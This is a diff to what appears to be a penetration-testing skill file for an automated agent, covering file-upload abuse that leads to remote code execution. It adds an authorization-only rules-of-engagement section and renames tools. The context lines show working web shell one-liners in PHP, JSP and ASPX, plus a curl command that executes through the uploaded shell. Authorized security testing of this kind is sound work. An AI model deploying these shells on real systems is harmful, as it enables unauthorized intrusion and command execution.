@@ -4,6 +4,9 @@ description: "File upload abuse to code execution. Triggers - multipart upload, 
 tags: [vuln_assess, exploitation]
 ---
 
+## Rules of Engagement
+Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.
+
 # File Upload → RCE
 
 ## When this fires
@@ -33,10 +36,10 @@ echo '<?php system($_GET["c"]); ?>' > shell.phtml     # PHP
 # JSP: <% Runtime.getRuntime().exec(request.getParameter("c")); %>   ASPX: Process.Start("cmd","/c "+Request["c"])
 curl 'http://<t>/uploads/shell.phtml?c=id'             # execute → prove
 ```
-**Proof required:** `id`/`whoami` from the uploaded shell (RCE). Then upgrade to a stable shell / `record_artifact`; drop markers where the engagement requires.
+**Proof required:** `id`/`whoami` from the uploaded shell (RCE). Then upgrade to a stable shell; record it via `state_update`; drop markers where the engagement requires.
 
 ## Tooling
-`filename_bypass` for encoded filename variants; `ffuf` to locate the upload dir; `exiftool` for magic-byte polyglots; `nuclei -tags fileupload`. Feed dir-discovery to `gobuster_parse`.
+`filename_bypass` for encoded filename variants; `ffuf` to locate the upload dir; `exiftool` for magic-byte polyglots; `nuclei -tags fileupload`. Run dir-discovery via `pentest_shell`; output auto-parses.
 
 ## False positives / pitfalls
 - Upload succeeds but dir is non-executable (static/CDN) → find an interpreted path, or pivot to LFI-include of the uploaded file.
